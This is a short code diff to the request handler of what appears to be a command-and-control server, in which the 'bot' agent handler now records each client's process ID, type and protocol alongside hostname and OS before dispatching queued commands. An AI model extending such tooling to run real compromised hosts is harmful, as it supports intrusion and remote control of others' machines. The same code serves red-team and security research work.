@@ -89,7 +89,7 @@ class request_handler():
     def agent_handler(self, sock, request, remote_ip):
         # Main func to direct bot actions
         try:
-            id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active')
+            id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active', request['PID'], request['TYPE'], request['PROTOCOL'])
             cmd = cmd_check(id)
             # Decode response data to perform checks, but leave encoded into DB
             decoded_resp = b64decode(request['Data']).decode('utf-8')
